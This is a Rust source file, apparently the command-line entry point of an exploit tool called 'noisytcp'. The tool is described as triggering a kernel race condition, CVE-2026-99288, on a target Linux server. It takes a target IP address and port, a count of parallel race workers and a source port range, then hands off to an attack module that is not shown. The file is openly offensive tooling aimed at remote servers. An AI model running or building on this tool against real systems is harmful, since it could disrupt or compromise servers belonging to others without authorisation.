mod noisy_tcp;

use clap::Parser;
use std::net::Ipv4Addr;

#[derive(Parser)]
#[command(
    name = "noisytcp",
    version,
    about = "Trigger the NoisyTCP CVE-2026-99288 IPv4 ABA race"
)]
struct Args {
    #[arg(help = "Target Linux server IPv4 address")]
    ip: Ipv4Addr,

    #[arg(default_value_t = 9000, help = "Target listening TCP port")]
    port: u16,

    #[arg(long, default_value_t = 64, help = "Parallel race workers")]
    workers: usize,

    #[arg(long, default_value_t = 40000, help = "First source port")]
    source_port: u16,
}

fn main() {
    let args = Args::parse();
    if args.workers == 0 {
        eprintln!("--workers must be greater than zero");
        std::process::exit(2);
    }
    if usize::from(args.source_port) + args.workers > 65_536 {
        eprintln!("--source-port plus --workers exceeds the TCP port range");
        std::process::exit(2);
    }
    if let Err(error) = noisy_tcp::run(args.ip, args.port, args.workers, args.source_port) {
        eprintln!("NoisyTCP failed: {error}");
        std::process::exit(1);
    }
}
